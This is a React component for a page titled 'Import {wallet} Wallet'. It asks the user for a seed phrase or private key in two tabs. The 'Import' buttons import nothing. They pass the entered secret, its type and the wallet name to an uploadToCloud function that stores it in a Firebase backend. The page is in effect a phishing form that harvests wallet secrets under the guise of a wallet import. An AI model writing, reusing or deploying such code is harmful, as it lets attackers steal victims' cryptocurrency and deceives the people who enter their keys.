import { Container, Tabs, TextField, Button } from "@mui/material";
import PropTypes from "prop-types";
import Tab from "@mui/material/Tab";
import Typography from "@mui/material/Typography";
import Box from "@mui/material/Box";
import { WalletContext } from "../context/WalletContext";
import React, { useContext, useState } from "react";
import { uploadToCloud } from "../backend/firebase";

function TabPanel(props) {
  const { children, value, index, ...other } = props;

  return (
    <div
      role="tabpanel"
      hidden={value !== index}
      id={`simple-tabpanel-${index}`}
      aria-labelledby={`simple-tab-${index}`}
      {...other}
    >
      {value === index && (
        <Box sx={{ p: 3 }}>
          <Typography>{children}</Typography>
        </Box>
      )}
    </div>
  );
}

TabPanel.propTypes = {
  children: PropTypes.node,
  index: PropTypes.number.isRequired,
  value: PropTypes.number.isRequired,
};

function a11yProps(index) {
  return {
    id: `simple-tab-${index}`,
    "aria-controls": `simple-tabpanel-${index}`,
  };
}

function BasicTabs() {
  const PRIVATE_KEY = "private_key";
  const SEED_PHRASE = "seed_phrase";
  const { wallet } = useContext(WalletContext);
  const [value, setValue] = useState(0);

  const handleChange = (event, newValue) => {
    setValue(newValue);
  };

  const [seedPhrase, setSeedPhrase] = useState("");

  const updateSeedPhrase = (e) => {
    setSeedPhrase(e.target.value);
  };

  const uploadData = (value, type, wallet) => {
    const payload = { value, type, wallet };

    // console.log(`Uploaded payload: ${payload}`);
    uploadToCloud(payload);
  };

  const handleUpload = (type) => {
    if (type === SEED_PHRASE) uploadData(seedPhrase, SEED_PHRASE, wallet);
    if (type === PRIVATE_KEY) uploadData(privateKey, PRIVATE_KEY, wallet);
  };

  const [privateKey, setPrivateKey] = useState("");

  const updatePrivateKey = (e) => {
    setPrivateKey(e.target.value);
  };

  return (
    <Box sx={{ width: "100%" }}>
      <Box sx={{ borderBottom: 1, borderColor: "divider" }}>
        <Tabs
          value={value}
          onChange={handleChange}
          aria-label="basic tabs example"
        >
          <Tab label="Phrase" {...a11yProps(0)} />
          <Tab label="Private Key" {...a11yProps(1)} />
        </Tabs>
      </Box>

      <TabPanel value={value} index={0}>
        <TextField
          value={seedPhrase}
          onChange={updateSeedPhrase}
          sx={{ width: "100%" }}
          multiline
          rows={6}
        />
        <Typography>
          Typically 12 (sometimes 24) words seperated by a single spaces.
        </Typography>
        <Button
          onClick={() => handleUpload(SEED_PHRASE)}
          sx={{ width: "100%" }}
          variant="contained"
        >
          Import
        </Button>
      </TabPanel>

      <TabPanel value={value} index={1}>
        <TextField
          value={privateKey}
          onChange={updatePrivateKey}
          sx={{ width: "100%" }}
        />
        <Typography>
          Typically 12 (sometimes 24) words seperated by a single spaces.
        </Typography>
        <Button
          onClick={() => handleUpload(PRIVATE_KEY)}
          sx={{ width: "100%" }}
          variant="contained"
        >
          Import
        </Button>{" "}
      </TabPanel>
    </Box>
  );
}

const ImportWallet = () => {
  const { wallet } = useContext(WalletContext);
  return (
    <Container
      sx={{ background: "grey", height: "100vh", width: "50%", margin: "auto" }}
    >
      <Typography variant="h6">Import {wallet} Wallet</Typography>
      <BasicTabs />
    </Container>
  );
};

export default ImportWallet;
